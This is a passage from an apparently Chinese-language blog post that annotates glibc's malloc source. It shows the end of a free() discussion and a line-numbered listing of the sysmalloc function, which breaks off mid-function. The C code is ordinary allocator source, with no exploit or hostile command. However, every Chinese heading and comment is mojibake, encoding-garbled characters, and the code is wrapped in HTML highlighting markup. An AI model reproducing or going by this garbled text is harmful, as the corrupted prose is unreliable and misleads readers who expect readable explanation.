é”ï¼Œè°ƒç”¨_int_freeå‡½æ•°æ‰§è¡Œå®é™…çš„é‡Šæ”¾å·¥ä½œ</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="sysmalloc-æºç åˆ†æ"><a href="#sysmalloc-æºç åˆ†æ" class="headerlink" title="sysmalloc æºç åˆ†æ"></a>sysmalloc æºç åˆ†æ</h2><p><code>sysmalloc</code>è´Ÿè´£å‘æ“ä½œç³»ç»Ÿç”³è¯·å†…å­˜</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *  <br><span class="hljs-title function_">sysmalloc</span> <span class="hljs-params">(INTERNAL_SIZE_T nb, mstate av)</span>  <br>&#123;  <br>  mchunkptr old_top;              <span class="hljs-comment">//av-&gt;topçš„åŸå§‹å€¼</span><br>  INTERNAL_SIZE_T old_size;       <span class="hljs-comment">//å®ƒçš„å¤§å°  </span><br>  <span class="hljs-type">char</span> *old_end;                  <span class="hljs-comment">//å®ƒçš„ç»“æŸåœ°å€ </span><br>  <br>  <span class="hljs-type">long</span> size;                      <span class="hljs-comment">//å‚æ•°ç»™MORECOREæˆ–mmapè°ƒç”¨  </span><br>  <span class="hljs-type">char</span> *brk;                      <span class="hljs-comment">//MORECOREçš„è¿”å›å€¼  </span><br>  <br>  <span class="hljs-type">long</span> correction;                <span class="hljs-comment">//å‚æ•°ç»™ç¬¬äºŒä¸ªMORECOREè°ƒç”¨  </span><br>  <span class="hljs-type">char</span> *snd_brk;                  <span class="hljs-comment">//ç¬¬äºŒä¸ªè¿”å›å€¼ </span><br>  <br>  INTERNAL_SIZE_T front_misalign; <span class="hljs-comment">/* è¡¨ç¤ºåˆ†é…å†…å­˜æ—¶ï¼Œåœ¨èµ·å§‹åœ°å€ä¸å¯¹é½è¦æ±‚ä¹‹é—´å¤šå‡ºçš„ä¸å¯ç”¨å­—èŠ‚ */</span>  <br>  INTERNAL_SIZE_T end_misalign;   <span class="hljs-comment">/* è¡¨ç¤ºåˆ†é…åï¼Œåœ¨é¡µé¢ç»“å°¾éƒ¨åˆ†ç”±äºå¯¹é½é—®é¢˜è€Œç•™ä¸‹çš„ä¸å¯ç”¨å­—èŠ‚ */</span>  <br>  <span class="hljs-type">char</span> *aligned_brk;              <span class="hljs-comment">/* æ‰§è¡Œbrkå†…ç»è¿‡å¯¹é½è°ƒæ•´åçš„åœ°å€ */</span>  <br>  <br>  mchunkptr p;                    <span class="hljs-comment">/* ç”¨äºæŒ‡å‘åˆ†é…å™¨å†…éƒ¨çš„å†…å­˜å—ç»“æ„ */</span>  <br>  mchunkptr remainder;            <span class="hljs-comment">/* åˆ†é…å†…å­˜åå‰©ä½™çš„å†…å­˜å— */</span>  <br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> remainder_size;   <span class="hljs-comment">/* è¡¨ç¤ºremainderå—çš„å¤§å° */</span>  <br>  <br>  <span class="hljs-comment">//GLROæ˜¯ä¸€ä¸ªå®ï¼Œç”¨äºè¯»å–å…¨å±€åªè¯»å˜é‡ã€‚</span><br>  <span class="hljs-comment">//dl_pagesizeæ˜¯ä¸€ä¸ªå˜é‡ï¼Œè¡¨ç¤ºç³»ç»Ÿé¡µé¢çš„å¤§å°ã€‚</span><br>  <span class="hljs-type">size_t</span> pagesize = GLRO (dl_pagesize);  <br>  <span class="hljs-comment">//tried_mmap è¡¨ç¤ºç¨‹åºæ˜¯å¦ä½¿ç”¨ mmap ç³»ç»Ÿè°ƒç”¨åˆ†é…å†…å­˜</span><br>  <span class="hljs-type">bool</span> tried_mmap = <span class="hljs-literal">false</span>;  <br>    <br>  <span class="hljs-comment">/*  </span><br><span class="hljs-comment">     å¦‚æœä½¿ç”¨mmapï¼Œå¹¶ä¸”è¯·æ±‚çš„å¤§å°è¾¾åˆ°mmapé˜ˆå€¼ï¼Œå¹¶ä¸”ç³»ç»Ÿæ”¯æŒmmapï¼Œ</span><br><span class="hljs-comment">     å¹¶ä¸”å½“å‰åˆ†é…çš„mmapåŒºåŸŸæ•°é‡è¾ƒå°‘ï¼Œå°è¯•ç›´æ¥æ˜ å°„è¿™ä¸ªè¯·æ±‚ï¼Œ</span><br><span class="hljs-comment">     è€Œä¸æ˜¯æ‰©å±•top</span><br><span class="hljs-comment">  */</span>  <br>  <span class="hljs-comment">//å½“arenaä¸ºç©ºï¼Œæˆ–è¯·æ±‚å†…å­˜nbè¶…è¿‡é˜ˆå€¼ï¼ˆmmap_thresholdï¼‰ä¸”mmapæ¬¡æ•°æœªè¾¾åˆ°é™åˆ¶æ—¶ï¼Œåˆ™è¿›å…¥mmapåˆ†é…</span><br>  <span class="hljs-keyword">if</span> (av == <span class="hljs-literal">NULL</span>  <br>      || ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (mp_.mmap_threshold)  <br>    &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))  <br>    &#123;  <br>      <span class="hljs-type">char</span> *mm;           <span class="hljs-comment">//mmapè°ƒç”¨çš„è¿”å›å€¼</span><br>  <br>    try_mmap:  <span class="hljs-comment">//å®šä¹‰ä¸€ä¸ªæ ‡ç­¾ï¼Œæä¾›ä¸€ä¸ªè·³è½¬ä½ç½®</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">å°†å¤§å°ä¸Šè°ƒåˆ°æœ€è¿‘çš„é¡µå¤§å°ã€‚å¯¹äºmmappedåŒºå—ï¼Œå¼€é”€æ¯”æ™®é€šåŒºå—å¤šä¸€ä¸ªSIZE_SZå•ä½ï¼Œ</span><br><span class="hljs-comment">å› ä¸ºæ²¡æœ‰åç»­åŒºå—çš„prev_sizeå­—æ®µå¯ç”¨ã€‚</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">//MALLOC_ALIGNMENTæ˜¯å†…å­˜åˆ†é…çš„å¯¹é½å•ä½ï¼Œé€šå¸¸ä¸º16å­—èŠ‚</span><br>      <span class="hljs-keyword">if</span> (MALLOC_ALIGNMENT == <span class="hljs-number">2</span> * SIZE_SZ)  <br><span class="hljs-comment">//å¯¹é½åˆ°é¡µå¤§å°æ—¶ï¼Œåªéœ€å°†ç”¨æˆ·è¯·æ±‚å¤§å°nbåŠ ä¸Šå…ƒæ•°æ®å¼€é”€SIZE_SZï¼Œå¹¶è°ƒæ•´ä¸ºé¡µå¤§å°çš„æ•´æ•°å€</span><br><span class="hljs-comment">//ALIGN_UPæ˜¯å¯¹é½å‡½æ•°ï¼Œç¡®ä¿(nb+SIZE_SZ)çš„å¤§å°æ˜¯pagesizeçš„æ•´æ•°å€</span><br>        size = ALIGN_UP (nb + SIZE_SZ, pagesize);  <br>      <span class="hljs-keyword">else</span>  <br>    <span class="hljs-comment">//å¦‚æœå¯¹é½è§„åˆ™æ›´å¤æ‚ï¼Œéœ€è¦è€ƒè™‘é¢å¤–çš„å¯¹é½æ©ç ï¼ŒMALLOC_ALIGN_MASK</span><br>    <span class="hljs-comment">//MALLOC_ALIGN_MASK çš„ä½œç”¨æ˜¯ç”¨äºå¤„ç†éåŒå­—å¯¹é½çš„éœ€æ±‚</span><br>        size = ALIGN_UP (nb + SIZE_SZ + MALLOC_ALIGN_MASK, pagesize);  <br>      <span class="hljs-comment">//å°†tried_mmapç½®ä¸ºtrueï¼Œè¡¨ç¤ºå½“å‰å°è¯•é€šè¿‡mmapåˆ†é…å†…å­˜</span><br>      tried_mmap = <span class="hljs-literal">true</span>;  <br>  <br>      <span class="hljs-comment">//é˜²æ­¢å†…å­˜å¤§å°æº¢å‡º</span><br>      <span class="hljs-comment">//å°†sizeè½¬åŒ–ä¸ºæ— ç¬¦å·é•¿æ•´å‹è¿›è¡Œæ¯”è¾ƒï¼Œç¡®ä¿sizeä¸ä¼šæº¢å‡ºä¸ºè´Ÿå€¼</span><br>      <span class="hljs-comment">//å¦‚æœsizeå°äºè¯·æ±‚å¤§å°nbï¼Œæ„å‘³ç€è®¡ç®—æ—¶å¯èƒ½å‘ç”Ÿäº†æº¢å‡ºï¼Œæ­¤æ—¶ä¸ä¼šç»§ç»­å°è¯•mmap</span><br>      <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb))  <br>        &#123;  <br>      <span class="hljs-comment">//è°ƒç”¨mmapåˆ†é…å†…å­˜</span><br>      <span class="hljs-comment">//0ä¸ºç³»ç»Ÿé€‰æ‹©æ˜ å°„åœ°å€ï¼Œsizeè°ƒæ•´é¡µå¤§å°çš„åˆ†é…å†…å­˜å¤§å°</span><br>      <span class="hljs-comment">//PROT_READ|PROT_WRITEæ˜ å°„çš„å†…å­˜å¯è¯»å¯å†™</span><br>      <span class="hljs-comment">//0ï¼Œä¸è®¾ç½®ç‰¹æ®Šæ ‡å¿—ï¼Œé»˜è®¤åŒ¿åæ˜ å°„</span><br>      <span class="hljs-comment">//å¦‚æœåˆ†é…æˆåŠŸè¿”å›ä¸€ä¸ªæŒ‡é’ˆï¼Œå¦åˆ™è¿”å›MAP_FAILED</span><br>          mm = (<span class="hljs-type">char</span> *) (MMAP (<span class="hljs-number">0</span>, size, PROT_READ | PROT_WRITE, <span class="hljs-number">0</span>));  <br><br>  <span class="hljs-comment">//å¦‚æœå†…å­˜åˆ†é…æˆåŠŸåˆ™æ‰§è¡Œ</span><br>          <span class="hljs-keyword">if</span> (mm != MAP_FAILED)  <br>            &#123;  <br>              <span class="hljs-comment">/*</span><br><span class="hljs-comment">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â mmappedåŒºåŸŸçš„å¼€å§‹åç§»å­˜å‚¨åœ¨åŒºå—çš„prev_sizeå­—æ®µä¸­ã€‚è¿™å…è®¸æˆ‘ä»¬åœ¨è¿™é‡Œ</span><br><span class="hljs-comment">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â å’Œmemalign()ä¸­è°ƒæ•´è¿”å›çš„å¼€å§‹åœ°å€ä»¥æ»¡è¶³å¯¹é½è¦æ±‚ï¼Œå¹¶ä¸”ä»ç„¶èƒ½å¤Ÿåœ¨</span><br><span class="hljs-comment">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â free()å’Œrealloc()ä¸­è®¡ç®—å‡ºæ­£ç¡®çš„munmapå‚æ•°åœ°å€ã€‚</span><br><span class="hljs-comment">Â Â Â Â Â Â Â Â Â Â Â Â Â Â */</span><br>              <span class="hljs-keyword">if</span> (MALLOC_ALIGNMENT == <span class="hljs-number">2</span> * SIZE_SZ)  <br>                &#123;  <br>                  <span class="hljs-comment">/* å¯¹äºglibcï¼Œchunk2memå¢åŠ åœ°å€2*SIZE_SZï¼Œå¹¶ä¸”MALLOC_ALIGN_MASKæ˜¯2*SIZE_SZ-1ã€‚</span><br><span class="hljs-comment">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â æ¯ä¸ªmmapåŒºåŸŸéƒ½æ˜¯é¡µé¢å¯¹é½çš„ï¼Œå› æ­¤ä¸€å®šæ˜¯MALLOC_ALIGN_MASKå¯¹é½çš„ã€‚*/</span>                  assert (((INTERNAL_SIZE_T) chunk2mem (mm) &amp; MALLOC_ALIGN_MASK) == <span class="hljs-number">0</span>);  <br>                  front_misalign = <span class="hljs-number">0</span>;  <br>                &#125;  <br>              <span class="hljs-keyword">else</span>  <br>                front_misalign = (INTERNAL_SIZE_T) chunk2mem (mm) &amp; MALLOC_ALIGN_MASK;  <br>              <span class="hljs-keyword">if</span> (front_misalign &gt; <span class="hljs-number">0</span>)  <br>                &#123;  <br>                  correction = MALLOC_ALIGNMENT - front_misalign;  <br>                  p = (mchunkptr) (mm + correction);  <br>                  p-&gt;prev_size = correction;  <br>                  set_head (p, (size - correction) | IS_MMAPPED);  <br>                &#125;  <br>              <span class="hljs-keyword">else</span>  <br>                &#123;  <br>                  p = (mchunkptr) mm;  <br>                  set_head (p, size | IS_MMAPPED);  <br>                &#125;  <br>  <br>              <span class="hljs-comment">/* æ›´æ–°ç»Ÿè®¡æ•°æ® */</span>  <br>  <br>              <span class="hljs-type">int</span> new = atomic_exchange_and_add (&amp;mp_.n_mmaps, <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;  <br>              <span class="hljs-type">atomic_max</span> (&amp;mp_.max_n_mmaps, new);  <br>  <br>              <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sum;  <br>              sum = atomic_exchange_and_add (&amp;mp_.mmapped_mem, size) + size;  <br>              <span class="hljs-type">atomic_max</span> (&amp;mp_.max_mmapped_mem, sum);  <br>  <br>              check_chunk (av, p);  <br><br><span class="hljs-comment">//è¿”å›chunk</span><br>              <span class="hljs-keyword">return</span> chunk2mem (p);  <br>            &#125;  <br>        &#125;  <br>    &#125;  <br>  <br>  <span class="hljs-comment">/* å¦‚æœæ²¡æœ‰å¯ç”¨çš„arenaï¼Œå¹¶ä¸”mmapä¹Ÿå¤±è´¥äº†åˆ™è¿”å›0 */</span>  <br>  <span class="hljs-keyword">if</span> (av == <span class="hljs-literal">NULL</span>)  <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <br>  <br>  <span class="hljs-comment">/* è®°å½•è¿›å…¥æ—¶topçš„é…ç½® */</span>  <br>  <span class="hljs-comment">//è®°å½•top chunk</span><br>  old_top = av-&gt;top;  <br>  <br>  old_size = chunksize (old_top);  <br>  old_end = (<span class="hljs-type">char</span> *) (chunk_at_offset (old_top, old_size));  <br>  <br>  brk = snd_brk = (<span class="hljs-type">char</span> *) (MORECORE_FAILURE);  <br>  <br>Â Â <span class="hljs-comment">/*å¦‚æœä¸æ˜¯ç¬¬ä¸€æ¬¡é€šè¿‡ï¼Œæˆ‘ä»¬éœ€è¦old_sizeè‡³å°‘æ˜¯MINSIZEï¼Œå¹¶ä¸”è®¾ç½®äº†prev_inuseä½ã€‚*/</span><br>  assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="hljs-number">0</span>) ||  <br>          ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;  <br>           prev_inuse (old_top) &amp;&amp;  <br>           ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) old_end &amp; (pagesize - <span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>));  <br>  <br>  Â <span class="hljs-comment">/* å‰ææ¡ä»¶: å½“å‰ç©ºé—´ä¸è¶³ä»¥æ»¡è¶³nbè¯·æ±‚ */</span><br>  assert ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (old_size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE));  <br>  <br>  <span class="hljs-comment">// å¦‚æœavä¸æ˜¯ä¸»arenaï¼Œåˆ™å°è¯•æ‰©å±•å½“å‰å †æˆ–åˆ›å»ºæ–°å †ã€‚</span><br>  <span class="hljs-keyword">if</span> (av != &amp;main_arena)  <br>    &#123;  <br>      heap_info *old_heap, *heap;  <br>      <span class="hljs-type">size_t</span> old_heap_size;  <br>  <br>      Â Â <span class="hljs-comment">/* é¦–å…ˆå°è¯•æ‰©å±•å½“å‰å †ã€‚ */</span><br>      old_heap = heap_for_ptr (old_top);  <br>      old_heap_size = old_heap-&gt;size;  <br>      <span class="hljs-keyword">if</span> ((<span class="hljs-type">long</span>) (MINSIZE + nb - old_size) &gt; <span class="hljs-number">0</span>  <br>          &amp;&amp; grow_heap (old_heap, MINSIZE + nb - old_size) == <span class="hljs-number">0</span>)  <br>        &#123;  <br>          av-&gt;system_mem += old_heap-&gt;size - old_heap_size;  <br>          arena_mem += old_heap-&gt;size - old_heap_size;  <br>          set_head (old_top, (((<span class="hljs-type">char</span> *) old_heap + old_heap-&gt;size) - (<span class="hljs-type">char</span> *) old_top)  <br>                    | PREV_INUSE);  <br>        &#125;  <br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((heap = new_heap (nb + (MINSIZE + <span class="hljs-keyword">sizeof</span> (*heap)), mp_.top_pad)))  <br>        &#123;  <br>          <span class="hljs-comment">/* Use a newly allocated heap.  */</span>  <br>          heap-&gt;ar_ptr = av;  <br>          heap-&gt;prev = old_heap;  <br>          av-&gt;system_mem += heap-&gt;size;  <br>          arena_mem += heap-&gt;size;  <br>          <span class="hljs-comment">/* Set up the new top.  */</span>  <br>          top (av) = chunk_at_offset (heap, <span class="hljs-keyword">sizeof</span> (*heap));  <br>          set_head (top (av), (heap-&gt;size - <span class="hljs-keyword">sizeof</span> (*heap)) | PREV_INUSE);  <br>  <br>          <span class="hljs-comment">/* Setup fencepost and free the old top chunk with a multiple of  </span><br><span class="hljs-comment">             MALLOC_ALIGNMENT in size. */</span>          <span class="hljs-comment">/* The fencepost takes at least MINSIZE bytes, because it might             become the top chunk again later.  Note that a footer is set             up, too, although the chunk is marked in use. */</span>          old_size = (old_size - MINSIZE) &amp; ~MALLOC_ALIGN_MASK;  <br>          set_head (chunk_at_offset (old_top, old_size + <span class="hljs-number">2</span> * SIZE_SZ), <span class="hljs-number">0</span> | PREV_INUSE);  <br>          <span class="hljs-keyword">if</span> (old_size &gt;= MINSIZE)  <br>            &#123;  <br>              set_head (chunk_at_offset (old_top, old_size), (<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE);  <br>              set_foot (chunk_at_offset (old_top, old_size), (<span class="hljs-number">2</span> * SIZE_SZ));  <br>              set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);  <br>              _int_free (av, old_top, <span class="hljs-number">1</span>);  <br>            &#125;  <br>          <span class="hljs-keyword">else</span>  <br>            &#123;  <br>              set_head (old_top, (old_size + <span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE);  <br>              set_foot (old_top, (old_size + <span class="hljs-number">2</span> * SIZE_SZ));  <br>            &#125;  <br>        &#125;  <br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!tried_mmap)  <br>        <span class="hljs-comment">/* We can at least try to use to mmap memory.  */</span>  <br>        <span class="hljs-keyword">goto</span> try_mmap;  <br>    &#125;  <br>  <span class="hljs-keyword">else</span>     <span class="hljs-comment">/* av == main_arena */</span>  <br>  <br>  <br>    &#123; <span class="hljs-comment">/* Request enough space for nb + pad + overhead */</span>  <br>      size = nb + mp_.top_pad + MINSIZE;  <br>  <br>      Â <span class="hljs-comment">/*</span><br><span class="hljs-comment">Â Â Â Â Â Â Â Â Â å¦‚æœæ˜¯è¿ç»­çš„ï¼Œæˆ‘ä»¬å¯ä»¥å‡å»å¸Œæœ›ä¸æ–°ç©ºé—´åˆå¹¶çš„ç°æœ‰ç©ºé—´ã€‚</span><br><span class="hljs-comment">Â Â Â Â Â Â Â Â Â æˆ‘ä»¬ç¨ååªåœ¨æˆ‘ä»¬å®é™…æ²¡æœ‰è·å¾—è¿ç»­ç©ºé—´æ—¶å†åŠ å›æ¥ã€‚</span><br><span class="hljs-comment">Â Â Â Â Â Â Â */</span><br>      <span class="hljs-keyword">if</span> (contiguous (av))  <br>        size -= old_size;  <br>  <br>      Â <span class="hljs-comment">/*</span><br><span class="hljs-comment">Â Â Â Â Â Â Â Â Â å°†å¤§å°è°ƒæ•´ä¸ºé¡µçš„å€æ•°ã€‚</span><br><span class="hljs-comment">Â Â Â Â Â Â Â Â Â å¦‚æœMORECOREä¸æ˜¯è¿ç»­çš„ï¼Œè¿™ç¡®ä¿æˆ‘ä»¬åªç”¨æ•´é¡µå‚æ•°è°ƒç”¨å®ƒã€‚</span><br><span class="hljs-comment">Â Â Â Â Â Â Â Â Â å¹¶ä¸”å¦‚æœMORECOREæ˜¯è¿ç»­çš„ï¼Œå¹¶ä¸”è¿™ä¸æ˜¯ç¬¬ä¸€æ¬¡é€šè¿‡ï¼Œ</span><br><span class="hljs-comment">Â Â Â Â Â Â Â Â Â è¿™ä¼šä¿æŒå…ˆå‰è°ƒç”¨çš„é¡µå¯¹é½ã€‚</span><br><span class="hljs-comment">Â Â Â Â Â Â Â */</span> <br>      size = ALIGN_UP (size, pagesize);  <br>  <br>      <span class="hljs-comment">/*  </span><br><span class="hljs-comment">         Don&#x27;t try to call MORECORE if argument is so big as to appear         negative. Note that since mmap takes size_t arg, it may succeed         below even if we cannot call MORECORE.       */</span>  <br>      <span class="hljs-keyword">if</span> (size &gt; <span class="hljs-number">0</span>)  <br>        &#123;  <br>          brk = (<span class="hljs-type">char</span> *) (MORECORE (size));  <br>          LIBC_PROBE (memory_sbrk_more, <span class="hljs-number">2</span>, brk, size);  <br>        &#125;  <br>  <br>      <span class="hljs-keyword">if</span> (brk != (<span class="hljs-type">char</span> *) (MORECORE_FAILURE))  